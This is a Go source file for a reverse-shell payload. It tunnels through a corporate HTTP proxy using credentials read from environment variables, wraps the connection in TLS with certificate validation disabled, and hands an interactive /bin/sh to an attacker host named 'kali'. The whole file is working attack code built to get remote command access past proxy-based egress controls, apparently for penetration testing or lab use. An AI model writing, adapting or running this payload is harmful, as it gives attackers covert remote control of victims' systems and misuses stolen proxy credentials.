// tls_proxy_payload.go
package main

import (
        "crypto/tls"        // TLS client support
        "encoding/base64"   // For proxy Basic auth encoding
        "net"               // TCP networking
        "net/url"           // Proxy URL parsing
        "os"                // Environment variables + stdio
        "strings"           // String helpers
        "bufio"             // Buffered reading from proxy
        "fmt"               // Error printing
        "os/exec"           // Spawning a shell
)

// Target the proxy will CONNECT to
const (
        TARGET_IP   = "kali" //set to kali ip address
        TARGET_PORT = "443"
)

// getenvProxy looks for a proxy definition in common env vars.
// It returns the first one found, or empty string if none exist.
/* common web proxy env vars are:
    https_proxy=http://squiduser:squidpassword@squid:3128
    http_proxy=http://squiduser:squidpassword@squid:3128
    HTTPS_PROXY=http://squiduser:squidpassword@squid:3128
    HTTP_PROXY=http://squiduser:squidpassword@squid:3128
*/
func getenvProxy() string {
        for _, k := range []string{
                "HTTPS_PROXY",
                "https_proxy",
                "HTTP_PROXY",
                "http_proxy",
        } {
              if v := os.Getenv(k); v != "" {
                      return v
              }
        }
        return ""
}

func main() {
        // Read proxy from environment
        proxy := getenvProxy()

        // Ensure proxy has a scheme so url.Parse works
        if !strings.HasPrefix(proxy, "http://") &&
           !strings.HasPrefix(proxy, "https://") {
                proxy = "http://" + proxy
        }

        // Parse proxy URL
        u, _ := url.Parse(proxy)
        host := u.Hostname()
        port := u.Port()

        // Default Squid port if none specified
        if port == "" {
                port = "3128"
        }

        // Build Proxy-Authorization header if credentials exist
        auth := ""
        if u.User != nil {
              p, _ := u.User.Password()
              auth = base64.StdEncoding.EncodeToString(
                      []byte(u.User.Username() + ":" + p),
              )
        }

        // Open a raw TCP connection to the proxy
        conn, err := net.Dial("tcp", host+":"+port)
        if err != nil {
                return
        }

        // Construct HTTP CONNECT request
        req := "CONNECT " + TARGET_IP + ":" + TARGET_PORT + " HTTP/1.1\r\n"
        req += "Host: " +
                strings.TrimPrefix(
                        strings.Split(req, " ")[1],
                        "CONNECT ",
                ) + "\r\n"
        req += "Proxy-Connection: Keep-Alive\r\n"

        // Add proxy auth header
        if auth != "" {
                req += "Proxy-Authorization: Basic " + auth + "\r\n"
        }

        // End of HTTP headers
        req += "\r\n"

        // Send CONNECT request to proxy
        conn.Write([]byte(req))

        // Read proxy response headers until blank line
        br := bufio.NewReader(conn)
        for {
              l, _ := br.ReadString('\n')
              if strings.TrimSpace(l) == "" {
                      break
              }
        }

        // Wrap the established tunnel in TLS
        // InsecureSkipVerify disables cert validation
        tlsConn := tls.Client(conn, &tls.Config{
                InsecureSkipVerify: true,
        })

        // Perform TLS handshake over the CONNECT tunnel
        if err := tlsConn.Handshake(); err != nil {
                fmt.Fprintln(os.Stderr, "tls handshake:", err)
                return
        }

        // Spawn an interactive shell
        cmd := exec.Command("/bin/sh")

        // Bind shell I/O directly to the TLS connection
        cmd.Stdin  = tlsConn
        cmd.Stdout = tlsConn
        cmd.Stderr = tlsConn

        // Execute the shell
        cmd.Run()
}
